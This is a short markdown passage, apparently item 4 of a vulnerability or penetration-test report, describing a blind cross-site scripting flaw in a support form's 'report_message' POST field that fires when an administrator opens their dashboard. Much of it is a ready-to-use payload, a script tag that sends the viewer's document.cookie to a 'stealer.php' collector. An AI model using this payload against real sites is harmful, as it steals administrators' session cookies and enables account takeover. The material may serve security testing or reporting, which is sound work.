
### 4. Blind XSS (Contact Support)
**Parameter:** `report_message` (POST)
**Explanation:** The input is saved secretly and only executed when an Administrator views their Dashboard.
**Payload:**
```html
<script>fetch('stealer.php?c='+document.cookie)</script>
```
